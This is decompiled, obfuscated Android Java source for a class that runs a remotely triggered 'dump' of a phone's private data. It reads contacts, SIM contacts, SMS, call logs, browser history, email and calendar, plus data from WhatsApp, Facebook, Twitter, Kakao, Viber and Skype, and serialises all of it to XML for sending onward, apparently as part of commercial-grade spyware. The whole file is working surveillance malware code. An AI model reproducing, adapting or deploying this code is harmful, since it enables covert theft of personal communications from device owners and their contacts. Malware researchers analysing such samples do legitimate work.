package com.network.media;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.ContactsContract;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.agent.NetworkApp;
import com.network.android.android.monitor.NetworkManagerService;
import com.network.android.c.a.a;
import com.network.android.d.e;
import com.network.android.d.g;
import com.network.android.d.i;
import com.network.android.j;
import com.network.android.m;
import com.network.android.r;
import com.network.b.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

public final class f {

    /* renamed from: a  reason: collision with root package name */
    private static int f166a = 1;
    private static int b = 2;
    private static int c = 4;
    private static int d = 8;
    private static int e = 16;
    private static int f = 32;
    private static int g = 64;
    private static int h = 0;
    private static int i = 1;
    private static int j = 2;
    private static int k = 3;
    private static Handler l;

    static {
        HandlerThread handlerThread = new HandlerThread("Dump performDumpInANewThread");
        handlerThread.start();
        l = new Handler(handlerThread.getLooper());
    }

    public static void a(int i2) {
        try {
            a.a("clearDumpParamsAccordingToBitWise after loop");
            b.p = false;
            b.r = true;
            b.q = true;
            b.w = true;
            b.v = true;
            b.t = true;
            b.u = true;
            b.s = true;
            if ((f166a & i2) == f166a) {
                b.r = false;
                a.a("clearDumpParamsAccordingToBitWise .dumpContacts = false;");
            }
            if ((b & i2) == b) {
                b.q = false;
                a.a("clearDumpParamsAccordingToBitWise dumpSMS = false;");
            }
            if ((c & i2) == c) {
                b.w = false;
                a.a("clearDumpParamsAccordingToBitWise dumpEmails = false;");
            }
            if ((d & i2) == d) {
                b.v = false;
                a.a("clearDumpParamsAccordingToBitWise dumpWhatsApp = false;");
            }
            if ((e & i2) == e) {
                b.t = false;
                a.a("clearDumpParamsAccordingToBitWise dumpCall = false;");
            }
            if ((f & i2) == f) {
                b.u = false;
                a.a("clearDumpParamsAccordingToBitWise dumpCalander = false;");
            }
            if ((g & i2) == g) {
                b.s = false;
                a.a("clearDumpParamsAccordingToBitWise dumpBrowserData = false;");
            }
            a.a("clearDumpParamsAccordingToBitWise end");
        } catch (Throwable th) {
            a.a("ParseResponseCommands clearDumpParamsAccordingToBitWise exception: " + th.getMessage(), th);
            throw th;
        }
    }

    private static void a(Context context, ContentResolver contentResolver) {
        try {
            if (b.r) {
                a.a("Dump dumpContacts dumpContacts is true. returning");
                return;
            }
            Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            a.a("Dump innerDump Contacts Start");
            if (query != null) {
                int count = query.getCount();
                a.a("Dump innerDump Contacts count: " + count);
                if (count > 0) {
                    XmlSerializer newSerializer = Xml.newSerializer();
                    StringWriter stringWriter = new StringWriter();
                    SmsReceiver.a(newSerializer, stringWriter);
                    a.a("get innerDump Contacts: " + count);
                    if (count < 35) {
                        m.c(newSerializer, contentResolver);
                        b.c(context);
                        SmsReceiver.a(context, newSerializer, stringWriter);
                    } else {
                        SmsReceiver.a(context, newSerializer, stringWriter);
                        SmsReceiver.a(contentResolver, context);
                    }
                } else {
                    a.a("innerDump LOG_NO_CONTACTS 0 contacts !!!!!");
                    com.network.android.c.a.b.a(1, 2007, "LOG_NO_CONTACTS");
                    b.c(context);
                }
            } else {
                com.network.android.c.a.b.a(1, 2007, "LOG_NO_CONTACTS");
                a.a("innerDump LOG_NO_CONTACTS cur == null!!!!!");
            }
            try {
                Cursor query2 = contentResolver.query(Uri.parse("content://icc/adn"), null, null, null, null);
                if (query2 != null && query2.getCount() > 0) {
                    a.a("innerDump Sim Contacts  count: " + query2.getCount());
                    XmlSerializer newSerializer2 = Xml.newSerializer();
                    StringWriter stringWriter2 = new StringWriter();
                    SmsReceiver.a(newSerializer2, stringWriter2);
                    newSerializer2.startTag("", "contacts");
                    while (query2.moveToNext()) {
                        try {
                            String string = query2.getString(query2.getColumnIndex("name"));
                            String string2 = query2.getString(query2.getColumnIndex("number"));
                            if (!(string == null || string2 == null)) {
                                string2.replaceAll("\\D", "");
                                string2.replaceAll("&", "");
                                String replace = string.replace("|", "");
                                StringBuilder sb = new StringBuilder();
                                m.a(sb, replace, string2);
                                m.a(newSerializer2, "add", "sim" + query2.getString(query2.getColumnIndex("_id")), sb.toString());
                            }
                        } catch (Exception e2) {
                            a.a("innerDump read sim Exception- " + e2.getMessage(), e2);
                        }
                    }
                    newSerializer2.endTag("", "contacts");
                    SmsReceiver.a(context, newSerializer2, stringWriter2);
                }
                query2.close();
            } catch (Throwable th) {
                a.a("innerDump read sim Exception- " + th.getMessage(), th);
            }
            a.a("Dump innerDump Contacts End");
            SmsReceiver.c.post(new n());
        } catch (Throwable th2) {
        }
    }

    public static void a(String str) {
        a.a("Dump startDump");
        a.a("Dump startDump Build.VERSION.SDK_INT:" + Build.VERSION.SDK_INT);
        if (!c.d()) {
            a.a("Dump not over 18 (4.3) startDumpIntent by service");
            Intent action = new Intent(NetworkApp.a(), NetworkManagerService.class).setAction("ACTION_DUMP");
            action.putExtra("commandAck", str);
            NetworkApp.a().startService(action);
            return;
        }
        a.a("Dump IS OVER 18 (4.3) service is not allowed. performDumpInANewThread");
        b(str);
    }

    /* access modifiers changed from: private */
    public static synchronized void b(Context context, String str) {
        synchronized (f.class) {
            try {
                a.a("Dump innerDump Start commandAck : " + str);
                XmlSerializer newSerializer = Xml.newSerializer();
                StringWriter stringWriter = new StringWriter();
                SmsReceiver.a(newSerializer, stringWriter);
                ContentResolver contentResolver = context.getContentResolver();
                if (b.q) {
                    a.a("Dump dumpSms is true. returning");
                } else {
                    try {
                        a.a("Dump innerDump SMS Start");
                        m.b(newSerializer, contentResolver);
                        a.a("Dump innerDump SMS End");
                        SmsReceiver.a(context, newSerializer, stringWriter);
                        Thread.sleep(3);
                    } catch (Throwable th) {
                        a.a("Dump innerDump SMS Exception- " + th.getMessage(), th);
                    }
                    SmsReceiver.c.post(new p());
                }
                if (b.t) {
                    a.a("Dump dumpCall is true. returning");
                } else {
                    try {
                        XmlSerializer newSerializer2 = Xml.newSerializer();
                        StringWriter stringWriter2 = new StringWriter();
                        SmsReceiver.a(newSerializer2, stringWriter2);
                        a.a("Dump dumpCall Call Start");
                        m.d(newSerializer2, contentResolver);
                        a.a("Dump dumpCall Call End");
                        SmsReceiver.a(context, newSerializer2, stringWriter2);
                    } catch (Throwable th2) {
                        a.a("Dump dumpCall Call Exception- " + th2.getMessage(), th2);
                    }
                    SmsReceiver.c.post(new o());
                }
                j.a(context);
                b.c(context);
                try {
                    SmsReceiver.c.post(new l(context, contentResolver));
                } catch (Throwable th3) {
                    a.a("Dump innerDump getBrowserHistory Exception- " + th3.getMessage(), th3);
                }
                a(context, contentResolver);
                if (b.v) {
                    a.a("Dump dumpWhatsApp is true. returning");
                } else {
                    try {
                        Thread.sleep(3);
                        a.a("Dump innerDump whatsapp Start");
                        m.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump whatsapp End");
                        a.a("Dump innerDump Facebook Start");
                        com.network.android.d.a.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump Facebook End");
                        a.a("Dump innerDump Twitter Start");
                        context.getContentResolver();
                        g.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump Twitter End");
                        a.a("Dump innerDump Kakao Start");
                        context.getContentResolver();
                        com.network.android.d.c.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump Kakao End");
                        a.a("Dump innerDump Viber Start");
                        context.getContentResolver();
                        i.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump Viber End");
                        a.a("Dump innerDump Skype Start");
                        context.getContentResolver();
                        e.a(SmsReceiver.c, context, true);
                        a.a("Dump innerDump Skype End");
                    } catch (Throwable th4) {
                        a.a("Dump dumpIM  Exception- " + th4.getMessage(), th4);
                    }
                    SmsReceiver.c.post(new j());
                }
                if (b.w) {
                    a.a("Dump dumpMails is true. returning");
                } else {
                    try {
                        Thread.sleep(3);
                        a.a("Dump innerDump mail Start");
                        r.a(context, SmsReceiver.c);
                        a.a("Dump innerDump mail End");
                    } catch (Throwable th5) {
                        a.a("Dump innerDump dumpMails Exception- " + th5.getMessage(), th5);
                    }
                    SmsReceiver.c.post(new k());
                }
                try {
                    if (b.u) {
                        a.a("Dump dumpCalander dumpCalander is true. returning");
                        SmsReceiver.c.post(new h(str, context));
                        b.c(context);
                        com.network.h.b.b("/data/myappinfo");
                    } else {
                        Thread.sleep(3);
                        a.a("Dump dumpCalander Calendar Start");
                        com.network.a.a.a(contentResolver, SmsReceiver.c, context);
                        a.a("Dump dumpCalander Calendar End");
                        SmsReceiver.c.post(new i());
                        SmsReceiver.c.post(new h(str, context));
                        b.c(context);
                        com.network.h.b.b("/data/myappinfo");
                    }
                } catch (Throwable th6) {
                    a.a("Dump dumpCalander Calendar Exception- " + th6.getMessage(), th6);
                }
            } catch (Throwable th7) {
                if (str != null) {
                    com.network.android.c.a.b.a(0, 2003, "", com.network.h.b.c(str));
                    com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(str));
                } else {
                    com.network.android.c.a.b.a(0, 2003, "", null);
                }
                b.c(context);
                a.a("dump Exception- " + th7.getMessage(), th7);
            }
        }
    }

    public static void b(String str) {
        l.postDelayed(new g(str), 1);
    }
}
